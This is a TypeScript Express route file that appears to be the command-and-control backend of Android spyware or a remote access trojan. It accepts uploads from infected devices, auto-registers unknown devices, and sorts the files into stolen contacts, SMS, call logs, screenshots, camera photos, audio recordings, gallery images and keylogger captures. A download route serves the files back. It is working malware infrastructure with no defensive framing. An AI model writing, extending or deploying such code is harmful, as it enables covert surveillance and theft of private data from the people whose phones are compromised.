// Upload Routes - Receive files from Android devices
import express, { Request, Response } from "express";
import multer from "multer";
import { Device, DeviceLog, LogType } from "../models";
import { uploadValidation } from "../middleware/validation";
import logger from "../utils/logger";
import path from "path";
import fs from "fs";

const router = express.Router();

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(process.cwd(), "uploads");

    // Create uploads directory if it doesn't exist
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }

    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(
      null,
      file.fieldname + "-" + uniqueSuffix + path.extname(file.originalname),
    );
  },
});

const upload = multer({
  storage,
  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB max
  },
});

/**
 * POST /upload
 * Receive file uploads from Android devices
 * Headers: model (device model/ID)
 */
router.post(
  "/",
  upload.single("file"),
  async (req: Request, res: Response): Promise<void> => {
    try {
      const deviceModel = (req.headers.model as string) || "unknown";
      const file = req.file;

      if (!file) {
        res.status(400).json({ error: "No file uploaded" });
        return;
      }

      // Find or create device
      let device = await Device.findOne({
        where: { device_id: deviceModel },
      });

      if (!device) {
        logger.warn(`Upload from unknown device: ${deviceModel}`);
        // Create device record if it doesn't exist
        device = await Device.create({
          socket_id: "upload-" + Date.now(),
          device_id: deviceModel,
          model: deviceModel,
          version: "unknown",
          ip: req.ip || "unknown",
          last_seen_at: new Date(),
        });
      }

      // Determine log type from filename or content type
      let logType: LogType = LogType.FILE;
      const filename = file.originalname.toLowerCase();

      if (filename.includes("contact")) logType = LogType.CONTACTS;
      else if (filename.includes("sms")) logType = LogType.SMS;
      else if (filename.includes("call")) logType = LogType.CALLS;
      else if (filename.includes("screenshot")) logType = LogType.SCREENSHOT;
      else if (filename.includes("camera") || filename.includes("photo"))
        logType = LogType.CAMERA;
      else if (filename.includes("audio") || filename.includes("recording"))
        logType = LogType.AUDIO;
      else if (filename.includes("gallery")) logType = LogType.GALLERY;
      else if (filename.includes("keylog")) logType = LogType.KEYLOGGER;

      // Create device log
      await DeviceLog.create({
        device_id: device.id,
        type: logType,
        payload: {
          filename: file.originalname,
          mimetype: file.mimetype,
          size: file.size,
          uploadedAt: new Date().toISOString(),
        },
        file_path: file.path,
      });

      logger.info(
        `File uploaded from ${deviceModel}: ${file.originalname} (${file.size} bytes)`,
      );

      res.json({
        message: "File uploaded successfully",
        filename: file.filename,
        size: file.size,
      });
    } catch (error) {
      logger.error("Upload error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  },
);

/**
 * GET /upload/:filename
 * Download uploaded file
 */
router.get(
  "/:filename",
  uploadValidation.download,
  async (req: Request, res: Response): Promise<void> => {
    try {
      const filename = req.params.filename;
      const filePath = path.join(process.cwd(), "uploads", filename);

      if (!fs.existsSync(filePath)) {
        res.status(404).json({ error: "File not found" });
        return;
      }

      res.download(filePath);
    } catch (error) {
      logger.error("Download error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  },
);

export default router;
